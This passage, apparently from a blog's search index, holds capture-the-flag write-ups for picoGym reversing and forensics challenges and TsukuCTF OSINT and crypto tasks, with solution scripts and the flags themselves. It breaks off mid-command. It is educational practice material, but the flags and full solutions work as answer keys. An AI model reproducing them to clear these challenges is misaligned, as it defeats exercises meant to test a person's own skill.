bit in position p1 to position p2, and move the bit        that was in position p2 to position p1. Precondition: p1 &lt; p2 */         char mask1 = (char)(1 &lt;&lt; p1);        char mask2 = (char)(1 &lt;&lt; p2);         /* char mask3 = (char)(1&lt;&lt;p1&lt;&lt;p2);         mask1++; mask1--; */         char bit1 = (char)(c &amp; mask1);         char bit2 = (char)(c &amp; mask2);         /* System.out.println(\"bit1 \" + Integer.toBinaryString(bit1));        System.out.println(\"bit2 \" + Integer.toBinaryString(bit2)); */         char rest = (char)(c &amp; ~(mask1 | mask2));         char shift = (char)(p2 - p1);         char result = (char)((bit1&lt;&lt;shift) | (bit2&gt;&gt;shift) | rest);         return result;    }     public boolean checkPassword(String password) {        char[] scrambled = scramble(password);         char[] expected = {0xF4, 0xC0, 0x97, 0xF0, 0x77, 0x97, 0xC0, 0xE4, 0xF0, 0x77, 0xA4, 0xD0, 0xC5, 0x77, 0xF4, 0x86, 0xD0, 0xA5, 0x45, 0x96, 0x27, 0xB5, 0x77, 0xE0, 0x95, 0xF1, 0xE1, 0xE0, 0xA4, 0xC0, 0x94, 0xA4 };         return Arrays.equals(scrambled, expected);     } }Now after looking at the source code we can understand how it works. This is the work flow:  Gets input from the user  Divides it into three parts: first part consists of 8 characters, we can tell it‚Äôs picoCTF{} and the second parts consists of rest if the string except the last character which is supposed to be }. So the inner contents of the flag is stored in the variable f.  string f is being checked using the checkPassword method, the checkPassword method scrambles f using the scramble method.  In the scramble method, each character of the string is modified/encrypted using the switchBits method.  Then the returned modified/encrypted character array of the string is compared with predefined bytes of another character array expected. If it is equal it says ‚ÄúAccess Granted‚Äù.To find the value of the string f, we have to reverse the process and modify the source code. Here the reversed work flow.  Take the character array expected andFlag: picoCTF{num3r1cal_c0ntr0l_XXXXXXXX}"
  },
  
  {
    "title": "picoGym Reverse Engineering - Easy writeups",
    "url": "/posts/picogym_rev_easy_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, reverse-engineering",
    "date": "2025-05-24 19:00:00 +0530",
    





    
    "snippet": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice pl...",
    "content": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceEasyvault-door-trainingExplanation:So they have given us a java file - VaultDoorTraining.java with source code:import java.util.*;class VaultDoorTraining {    public static void main(String args[]) {        VaultDoorTraining vaultDoor = new VaultDoorTraining();        Scanner scanner = new Scanner(System.in);         System.out.print(\"Enter vault password: \");        String userInput = scanner.next();\tString input = userInput.substring(\"picoCTF{\".length(),userInput.length()-1);\tif (vaultDoor.checkPassword(input)) {\t    System.out.println(\"Access granted.\");\t} else {\t    System.out.println(\"Access denied!\");\t}   }    // The password is below. Is it safe to put the password in the source code?    // What if somebody stole our source code? Then they would know what our    // password is. Hmm... I will think of some ways to improve the security    // on the other doors.    //    // -Minion #9567    public boolean checkPassword(String password) {        return password.equals(\"w4rm1ng_Up_w1tH_jAv4_eec0716b713\");    }}From the given source code we can understand the working mechansim. The main function is called, then Prints the string ‚ÄúEnter the vault password‚Äù, then asks for input from the user. After taking the input, it slices the input to collect a substring. Checks if the substring is valid or not using the checkPassword method. From the source code we can get the flag. To check if it is valid or not, use the below command to run the java file.javac VaultDoorTraining.javajava VaultDoorTrainingWhen prompted for password, enter the complete string, which is - picoCTf{ + w4rm1ng_Up_w1tH_jAv4_eec0716b713 + }, the access will be grantedI got the flag!Flag: picoCTF{w4rm1ng_Up_w1tH_jAv4_xxxxxxxxxx}###"
  },
  
  {
    "title": "picoGym Forensics - Easy writeups",
    "url": "/posts/picogym_forensics_easy_writeup/",
    "categories": "CTF, PicoCTF",
    "tags": "ctf, writeups, cybersecurity, forensics, steganography",
    "date": "2025-05-08 11:00:00 +0530",
    





    
    "snippet": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice pl...",
    "content": "picoCTFAbout picoCTF:picoCTF gamifies learning hacking with capture-the-flag puzzles created by trusted computer security and privacy experts at Carnegie Mellon University.Using picoCTF practice platform, participants learn to overcome sets of challenges from six domains of cybersecurity including general skills, cryptography, web exploitation, forensics, etc. The challenges are all set up with the intent of being hacked, making it an excellent, legal way to get hands-on experience.picoGym is a noncompetitive practice space where you can explore and solve challenges from previously released picoCTF competitions, find fresh never before revealed challenges, and build a knowledge base of cybersecurity skills in a safe environment.Whether you are a cybersecurity professional, competitive hacker or new to CTFs you will find interesting challenges in the picoGym that you can solve at your own pace. Team picoCTF will regularly update this challenge repository so visit the picoGym often.This is their Official webpage - https://picoctf.org/This is their url for picoGym - https://play.picoctf.org/practiceEasyDISKO 1Explanation:We are given with a disk image named - disko-1.dd.gz, it looks like it compressed using gzip so I decompressed it using the below command.gzip -d disko-1.dd.gzIt returned disko-1.dd which is a - DOS/MBR boot sector, code offset 0x58+2, OEM-ID ‚Äúmkfs.fat‚Äù, Media descriptor 0xf8, sectors/track 32, heads 8, sectors 102400 (volumes &gt; 32 MB), FAT (32 bit), sectors/FAT 788, serial number 0x241a4420, unlabeled (by file command).I used exiftool but couldn‚Äôt find anything helpful. So I thought of using strings with grep to find the flag. I used the below command.strings disko-1.dd | grep \"picoCTF\"I got the flag!Flag: picoCTF{1t5_ju5t_4_5tr1n9_e3408eef}REDExplanation:We are given an image - red.png, which when opened is full of red color. I tried using exiftool and strings, but no progress. So I used zsteg thinking something maybe hidden using steganography.we can see some base64 text, which is the same string repeated three times continuously. So lets decode it using the below command.echo \"cGljb0NURntyM2RfMXNfdGgzX3VsdDFtNHQzX2N1cjNfZjByXzU0ZG4zNTVffQ==\" | base64 -dI got the flag!Flag: picoCTF{r3d_1s_th3_ult1m4t3_cur3_f0r_54dn355_}Ph4nt0m 1ntrud3rExplanation:They have given us a pcap file. When opened the pcap file I saw base64 strings in the TCP segment data of each log. They are in all the logs, but what I found is not all of them are base64. When filtered the time in ascending order, we can find legit base64 strings at the last logs. Now by collecting them we got:cGljb0NURg==ezF0X3c0cw==bnRfdGg0dA==XzM0c3lfdA==YmhfNHJfMw==NmY0YTY2Ng==fQ==which when decoded using base64, gives us the flag.I got the flag!Flag: picoCTF{1t_w4snt_th4t_34sy_tbh_4r_36f4a666}VerifyExplanation:After launcing the instance, we will be provided with a custom-port SSH login command and a password. Let‚Äôs try to connect to the shell using the given command and enter the password. You will be connected to the shell.After successfully connecting, we will be entering a challenge shell. Let‚Äôs try to check what are its contents using - ls command. It returns the following output:checksum.txt    decrypt.sh  filesAfter checking each of them using file command, it turns out:  checksum.txt is a text file  decrypt.sh is a shell script  files is a directory consisting of mutiple files.From the description of the challenge, we can understand that - the author says they are many fake flag, so to keep track of the real flag, he provides the SHA-256 hash of the real flag file and a decrypt file. So, what we can do is compare the SHA-256 hash of all the files in the - files directory with the hash provided in the checksum.txt.(What is SHA-256 hash? SHA-256 is a cryptographic hash function that produces a fixed 256-bit output from any input. SHA stands for Secure Hash Algorithm. It is deterministic, that means same input always gives the same hash and a checksum is another word for the hash output.)Using the below commands:sha256sum files/*The above command generate the checksum of all the files in the files directory. Now we need to compare the output generated that is the checksum of all the files with the provided checksum of checksum.txt to get the real flag.sha256sum files/* | grep -f checksum.txtThe above command will return the checksum and file name. Now checking the file using file commands returns the following:files/451fd69b: openssl enc'd data with salted passwordIt looks like it is encrypted, lets decrypt it using the decrypt.sh script provided. After checking the contents of decrypt.sh you can know how it works../decrypt.sh files/451fd69bAfter using the above we will get the flag.I got the flag!Flag: picoCTF{trust_but_verify_451fd69b}Scan SurpriseExplanation:After launcing the instance, you will be provided with custom-port SSH command and password. Connect to the shellAfter connecting, you will enter into the shell and a QR will be given. By using the - ls command in the current directory, you can see there is a file called flag.png. It looks like flag.png is the QR code. Now lets analyze the QR code using the below command.zbarimg flag.pngThis will return some data and you can see the flag.I got the flag!This challenge can also be solved using mobile QR code scanner and other online QR code scanners. You don‚Äôt need to connect to the shell to solve this challenge, you can also solve it by just downloading the challenge.zip provided, unzip it and go to the flag.png directory, and either scan or using the above command to get the flag.Flag: picoCTF{p33k_@_b00_d4ca652e}Secret of the PolyglotExplanation:The description says something about file types so first download the file.So they have given us a file named - flag2of2-final.pdf. After opening the pdf I found the flagüòÆ‚Ä¶‚Ä¶‚Ä¶.no, the half of it, the last half. I guess we will have to find out the other half.Now after using the file command on the given pdf file. It turns out, it is a png file. so I changed the file extension using move command.file flag2of2-final.pdfmv flag2of2-final.pdf flag2of2-final.pngNow after opening the png, I got the first half of the flag. Hence combining the first half and the last half we got before will give us the flag.I got the flag!Flag: picoCTF{f1u3n7_1n_pn9_&amp;_pdf_90974127}CanYouSeeExplanation:After downloading, we will get a - unknown.zip file. After unzipping we will get a jpg - ukn_reality.jpg. Now lets analysing it using few commands like file, exiftool and binwalk etc.,When used exiftool, it returns a suspective output.It looks like the value of - Attribution URL is a base64 encoded string, lets decrypt it.echo \"cGljb0NURntNRTc0RDQ3QV9ISUREM05fZGVjYTA2ZmJ9Cg==\" | base64 -dI got the flag!Flag: picoCTF{ME74D47A_HIDD3N_deca06fb}InformationExplanantion:So they have given us a file - cat.jpg saying files can be changed in a secret way.After using file, binwalk, strings and xxd commands I couldn‚Äôt find anything suspective but when I used exiftool command the got this output:exiftool cat.jpgNow looking at the value of the license, it looks sus, I think its base64 or something. Let‚Äôs try the below command.echo \"cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9\" | base64 -dI got the flag!Flag: picoCTF{the_m3tadata_1s_modified}Glory of the GardenExplanation:You can see the ‚Äúgarden‚Äù text in the description is colored blue, so a link must be attached to it. Aftering clicking on it, an image named - garden.jpg will be downloaded.After analysing the image using - file, exiftool and binwalk commands I couldn‚Äôt find anything. But after using the strings command on the jpg, it returned the flag in the last line.strings garden.jpgI got the flag!Flag: picoCTF{more_than_m33ts_the_3y33dd2eEF5}"
  },
  
  {
    "title": "TsukuCTF 2025 writeups",
    "url": "/posts/tsukuctf_2025_writeup/",
    "categories": "CTF, TsukuCTF",
    "tags": "ctf, writeups, cybersecurity, osint, pwn, cryptography",
    "date": "2025-05-04 11:00:00 +0530",
    





    
    "snippet": "TsukuCTF 2025About TsukuCTF:TsukuCTF is an annual CTF hosted by TaruTaruThis is a CTF with Japanese OSINT as the main genre. There are a few other genres mixed in as well..  TsukuCTF 2025 will be h...",
    "content": "TsukuCTF 2025About TsukuCTF:TsukuCTF is an annual CTF hosted by TaruTaruThis is a CTF with Japanese OSINT as the main genre. There are a few other genres mixed in as well..  TsukuCTF 2025 will be held online (competition URL: https://tsukuctf.org/ ).  The duration of the event is 24h00m from 12:00(JST) on 05/03/2025 to 11:59(JST) on 05/04/2025.  Genres will include OSINT, Web, Pwn, Crypto, etc.  Maximum number of players per team is 4  The event was conducted online from Sat, 03 May 2025, 08:30 IST ‚Äî Sun, 04 May 2025, 08:30 IST.This is their CTF webpage - https://tsukuctf.org/This is their CTFtime profile - https://ctftime.org/event/2769/tsukushiWelcomeTranslation:Flags are listed in the ‚Äúannouncements‚Äù channel of the official TsukuCTF Discord. Flag Format: TsukuCTF25{}Explanation:As the description said the flag is in the anncouncement channel of the discord server. I head over to the discord server, checked out the announcements. I found the flag in the same message they have announced the CTF has started.I got the flag!Flag: TsukuCTF25{welcome_to_TsukuCTF_2025!}OSINTcurveTranslation:These are some of the famous places in Japan. Can you spot anything unusual about this photo? The flag is the website domain for this place. Example: TsukuCTF25{example.com}Source:Explanation:After downloading, I used google lens on the image. After looking at few images I understood that the image is of an escalator in Landmark Tower (Yokohama), Japan. Searched for it in google, found it‚Äôs official websiteI got the flag!Flag: TsukuCTF25{yokohama-landmark.jp}destroyedTranslation:Identify the school in the photo of this Telegram post. The flag format should be the coordinates of the location rounded to the nearest 4 decimal places and written in the format TsukuCTF25{latitude_longitude} to the nearest 3 decimal places. Example: TsukuCTF25{12.345_123.456}Warning: In the process of solving this problem, you may see direct images related to war.23:14 GMT+9 Update: Flag addedSource:Telegram LinkExplanation:After visiting the telegram channel, looked over the images, checked the description of the post. Found that it is Stepne Community Gymnasium and from the flag emoji it is in Ukraine. So the war must be between Russia and Ukraine. We can see multiple news pages about the gymnasium when we use google lens on all the provided images.After using google maps and searching over Stepne in Zaporizhzhia Oblast looking for the gymnasium for quite a period of time. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{47.797_35.306}riderTranslation:Footprints that walk far away and disappear into the evening darkness, The glittering streetlights decorate the city at night, A group of motorbikes pass by on the road nearby, Only the sound of the wind remains, In the light and shadow, I suddenly stop and wonder, Where am I now?The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. However, the latitude and longitude are rounded down to the fifth decimal place.View Hint: This poem has no meaning.Source:Explanation:After looking at the image and using google lens, found some restaurant named ‚ÄúOTI fried chicken ‚Äú which is a restaurant chain in Indonesia.Using google maps and the restaurant‚Äôs official webpage, I looked over its branches. After looking at some of the branches came across a branch which has a panda logo on the side of it and the same street light from that in the image. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{-7.3189_110.4970}buildingsTranslation:Once that building is built, the sky will probably get narrower again.The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. Note that the latitude and longitude are rounded down to five decimal places.Source:Explanation:Used Google lens on the image. It provided me with two bulding names - Global Front tower and „É≠„Ç§„É§„É´„Éë„Éº„ÇØ„ÇπÂìÅÂ∑ù (Royal Parks Shinagawa). They are both from same place that is - Minato City, Tokyo, Japan.Using Google Maps searched for the places. Found the buildings that resembles those in the image. As the photo is taken on a road, I followed the road and observed the buildings to position them just like how the image looks. I got to the position where the photo was taken as everything matches perfectly. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{35.6318_139.7431}powerTranslation:I‚Äôve felt the power.The flag format is TsukuCTF25{latitude_longitude} of the location where this person is standing. Note that the latitude and longitude are rounded down to five decimal places.Source:Explanation:Looking at the image, it is tactile map of someplace in Japan( as the image contains a japanese character). It contains a braille etched metal plate.Used Google lens on the image, I searched the image by cropping it various ways after I cropped it full and added ‚ÄúJapan‚Äù to the search, looking over the results, I found the image which resembles the photo. The image is from a stockphoto website. After reading the description, it seems that the image is of ‚ÄúTaira no Masakado‚Äôs Grave‚ÄùUsing google maps went over to the location, looked for the maps, found them. Got the coordinated, rounded them.I got the flag!Flag: TsukuCTF25{35.6872_139.7628}Cryptoa8tsukuctfTranslation:I created a suitable KEY and encrypted it, but the tsukuctf part remains the same‚Ä¶Source:enc.py:import stringplaintext = '[REDACTED]'key = '[REDACTED]'#    &lt;plaintext&gt;               &lt;ciphertext&gt;# ...?? tsukuctf, ??... -&gt;  ...aa tsukuctf, hj...assert plaintext[30:38] == 'tsukuctf'# https://ja.wikipedia.org/wiki/%E3%83%B4%E3%82%A3%E3%82%B8%E3%83%A5%E3%83%8D%E3%83%AB%E6%9A%97%E5%8F%B7#%E6%95%B0%E5%BC%8F%E3%81%A7%E3%81%BF%E3%82%8B%E6%9A%97%E5%8F%B7%E5%8C%96%E3%81%A8%E5%BE%A9%E5%8F%B7def f(p, k):    p = ord(p) - ord('a')    k = ord(k) - ord('a')    ret = (p + k) % 26    return chr(ord('a') + ret)def encrypt(plaintext, key):    assert len(key) &lt;= len(plaintext)    idx = 0    ciphertext = []    cipher_without_symbols = []    for c in plaintext:        if c in string.ascii_lowercase:            if idx &lt; len(key):                k = key[idx]            else:                k = cipher_without_symbols[idx-len(key)]            cipher_without_symbols.append(f(c, k))            ciphertext.append(f(c, k))            idx += 1                  else:            ciphertext.append(c)    ciphertext = ''.join(c for c in ciphertext)    return ciphertextciphertext = encrypt(plaintext=plaintext, key=key)with open('output.txt', 'w') as f:    f.write(f'{ciphertext=}\\n')output.txtciphertext=\"ayb wpg uujmz pwom jaaaaaa aa tsukuctf, hj vynj? mml ogyt re ozbiymvrosf bfq nvjwsum mbmm ef ntq gudwy fxdzyqyc, yeh sfypf usyv nl imy kcxbyl ecxvboap, epa 'avb' wxxw unyfnpzklrq.\"Explanation:After checking the encryption python file it seems that this challenge is based on custom autokey Vigen√®re cipher. Based on the functions and the contents of output.txt, I have written a decrpytion python code:import stringciphertext = \"ayb wpg uujmz pwom jaaaaaa aa tsukuctf, hj vynj? mml ogyt re ozbiymvrosf bfq nvjwsum mbmm ef ntq gudwy fxdzyqyc, yeh sfypf usyv nl imy kcxbyl ecxvboap, epa 'avb' wxxw unyfnpzklrq.\"def f_inv(c, k):    c = ord(c) - ord('a')    k = ord(k) - ord('a')    p = (c - k + 26) % 26    return chr(ord('a') + p)def decrypt(ciphertext, known_plaintext_segment, segment_position):    idx = 0    plain = []    cipher_without_symbols = []    decrypted_key = []    letters_only = [c for c in ciphertext if c in string.ascii_lowercase]    for i in range(len(known_plaintext_segment)):        c = letters_only[segment_position + i]        p = known_plaintext_segment[i]        k = (ord(c) - ord(p)) % 26        k = chr(ord('a') + k)        decrypted_key.append(k)    idx = 0    key = decrypted_key    for c in ciphertext:        if c in string.ascii_lowercase:            if idx &lt; len(key):                k = key[idx]            else:                k = cipher_without_symbols[idx - len(key)]            p = f_inv(c, k)            cipher_without_symbols.append(c)            plain.append(p)            idx += 1        else:            plain.append(c)    return ''.join(plain), ''.join(decrypted_key)lower_only = [c for c in ciphertext if c in string.ascii_lowercase]segment = \"tsukuctf\"segment_position = 30  # Based on the assertplaintext, key = decrypt(ciphertext, segment, segment_position)print(\"Recovered key:\", key)print(\"\\nDecrypted plaintext:\\n\", plaintext)The above code when ran, returns the output:Recovered key: annzbwueDecrypted plaintext: alo xok aqjoy this problem or tsukuctf, or both? the flag is concatenate the seventh word in the first sentence, the third word in the second sentence, and 'fun' with underscores.Based on the decrypted plain text, the flag is seventh-word(firstSentence)_third-word(secondSentence)_fun.I got the flag!Flag: TsukuCTF25{tsukuctf_is_fun}PQC0Translation:I tried using PQC (Post-Quantum Cryptography)!Source:prob.py# REQUIRED: OpenSSL 3.5.0import osfrom Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom flag import flag# generate private keyos.system(\"openssl genpkey -algorithm ML-KEM-768 -out priv-ml-kem-768.pem\")# generate public keyos.system(\"openssl pkey -in priv-ml-kem-768.pem -pubout -out pub-ml-kem-768.pem\")# generate shared secretos.system(\"openssl pkeyutl -encap -inkey pub-ml-kem-768.pem -secret shared.dat -out ciphertext.dat\")with open(\"priv-ml-kem-768.pem\", \"rb\") as f:    private_key = f.read()print(\"==== private_key ====\")print(private_key.decode())with open(\"ciphertext.dat\", \"rb\") as f:    ciphertext = f.read()print(\"==== ciphertext(hex) ====\")print(ciphertext.hex())with open(\"shared.dat\", \"rb\") as f:    shared_secret = f.read()encrypted_flag = AES.new(shared_secret, AES.MODE_ECB).encrypt(pad(flag, 16))print(\"==== encrypted_flag(hex) ====\")print(encrypted_flag.hex())output.txt==== private_key ====-----BEGIN PRIVATE KEY-----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-----END PRIVATE KEY-----==== ciphertext(hex) ====83daaca5593e84b6b902645a25920e6f60c7c72ca8101b56b878434f20cd838f0f2086d3385e528f2687625a38822b74097d109f6d7b3ac730b7fd6a47c988324a6f3b3133b868d3db8b473b597151df4e4091e3ebf77843b6f84c420ffea899f6465d60ffabb3e1de10da2055a43abff172ecf44130a8f3663ff5c39a61d6a10d13cd72f0f289815c75c17687fd35a82503cfbdf790c5164ea739e0f34e7b23cd017a493bf60f8d0d083ce50257bdff7ec5a882e8c1132fc0ef7fed7543d74eb17624266413093d8ef1b80eb94ce97af443fa479a131b59393495d45f8b79271105abed644a423bad0a76bb86de6c5303c2f2eaf36b9d517201d3c670b46fde3e9282346abee87b9aea188936abef98ab9a10914007a26f6f05ccb007f0784870444e4c49002e256b8acd2842ac5d574b1b8592949c9e615882a811a101262713b3c673a885b44a4eac81000746a7ea7ec7e02b4511dd12f57dca62fb263cdc1dd9a1e5599b7c4823d02811acb4c51dff09060591be3370e250246ccd15dcd29ed037805a478ff87edecf184db4f5ce2f929212fc36b9f9d22fec6a5ca69d966ca10fff9d0aac6fcb197fdf03ddd5d32fcff27200f96d3eb7e6628df601874b83ead5e2bb965fb02d01e5e9593938b5ad49e473998fad055010fa8caf04366cab97838cbeed94d9b3b1051ea79d0e8d2dfae83b96efcc82b81539534d00825f8a22492bfac3869ee52af470a7718ee2149c1aa69377f675f922ac2d79477bdf5788f5af3a4b9bad63838b09c07069b1651416f9631475397e86739502dfd89b4c603bc7ed2c6c8fe46762db2412104c0dfdbf265b4f9dfc95d4e2408f9237e4c37e395fe219254569b48d7e3bd38807285204cb434f3a8e17ce96d95182a38c4e788f6bb7fac129e457f26769b80489d47631033f4d47702fc64649e40bb17818438ce04659ecf440b70e29ab332bf348897e504025250a12aea1297b47e6f6a8b4334152dea44f12dead1c2ae07e944dc214fc15a7eb3eedcbe7528c75daf7891ea59b92c26dd2a8e7d8e8a5e61d621c3c29132fade8a5c03a25fb8918dab80fe1b2ef0ac88a33d1b85f6e09f495813bea33a310e98f74f9286f78e451ef9a43f35f738a0d1148bd427fc51cc5e1da59d6c3ad4531f63b3aacda096d062b73e66b1f5a74d015da0dfb215b52c65203ba2a1c7ca67996081451669989f919b33b4c016faa9e81722dbe2c6132976c997172a34fd95ba6023bb4798b6ebded93deb0f80a493bb4d430b6faf01010f4e14504c8a46213ab749aacd6f0f08dc0157f132859f6d02312ed6c015c6e2cc63c97e6ad6e7408135f45a0e1f4ae9a858c1d7dbd40cf7ac33f74d61a3dfcaa8fda39768e088ead498093d71e930f03d320ef46f47d45995453950d21fba2704486c203789cf616fbf6b7c9f120c06c43ec0548b8a90201aa54e0d756d1c3e5c1e7bf56cc887c8eeaa173229b644da640671872cbcf9a96150c2deafdc7ea5036a9a9fa828ee3558e4e65a988131ea7ab65==== encrypted_flag(hex) ====5f2b9c04a67523dac3e0b0d17f79aa2879f91ad60ba8d822869ece010a7f78f349ab75794ff4cb08819d79c9f44467bdExplanation:Looking at the given encryption source code and output.txt. The code uses ML-KEM-768 (Kyber768) for key encapsulation and AES for encrypting the flag.The provided prob.py script generates an ML-KEM-768 private key: priv-ml-kem-768.pem, derives the corresponding public key: pub-ml-kem-768.pem. Uses the public key to encapsulate a shared secret, producing: ciphertext.dat and shared.dat( the derived shared secret ).To decrypt it, we need the shared secret.For that, from the output.txt the created three files:  Private Key: Save the PEM-formatted private key between the ‚Äî‚ÄìBEGIN PRIVATE KEY‚Äî‚Äì and ‚Äî‚ÄìEND PRIVATE KEY‚Äî‚Äì lines into a file named priv-ml-kem-768.pem.  Ciphertext: Convert the hex string under ==== ciphertext(hex) ==== into binary and save it as ciphertext.dat.  Encrypted Flag: Convert the hex string under ==== encrypted_flag(hex) ==== into binary and save it as encrypted_flag.bin.Used OpenSSL to decapsulate the shared secret.openssl pkeyutl -decap -inkey priv-ml-kem-768.pem -in 